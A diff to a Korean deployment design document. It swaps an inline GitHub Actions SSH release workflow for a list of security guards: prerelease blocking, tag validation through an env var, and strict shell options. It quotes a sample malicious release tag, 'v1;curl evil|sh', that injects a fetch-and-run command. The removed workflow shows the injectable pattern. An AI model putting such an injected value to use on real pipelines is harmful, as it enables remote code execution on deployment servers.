@@ -29,32 +29,12 @@
 
 ### 4.1 워크플로우 (`.github/workflows/deploy.yml`)
 
-```yaml
-name: Deploy on Release
+핵심 보안 가드 (Codex 리뷰 반영):
+- **`if:` prerelease/draft 차단** — prerelease 가 운영 배포되지 않음
+- **태그 env var 경유 + semver 정규식 검증** — `${{ release.tag_name }}` 가 remote shell에 직접 expand되면 악성 태그 (`v1;curl evil|sh`) 가 명령 실행 가능. env var로 받아 quoted 사용 + 형식 검증으로 차단.
+- **`set -euo pipefail`** — 명령 실패 즉시 중단, 정의 안 된 변수 사용 차단
 
-on:
-  release:
-    types: [published]
-
-permissions:
-  contents: read
-
-jobs:
-  deploy:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: appleboy/ssh-action@v1.2.2
-        with:
-          host: ${{ secrets.DEPLOY_SSH_HOST }}
-          username: ${{ secrets.DEPLOY_SSH_USER }}
-          key: ${{ secrets.DEPLOY_SSH_KEY }}
-          port: ${{ secrets.DEPLOY_SSH_PORT }}
-          command_timeout: 30m
-          script: |
-            set -e
-            cd ${{ secrets.DEPLOY_PATH }}
-            ./deploy/deploy.sh ${{ github.event.release.tag_name }}
-```
+실제 구현은 `.github/workflows/deploy.yml` 참조 (44줄).
 
 ### 4.2 SSH 키 발급 절차 (운영자 1회)
 
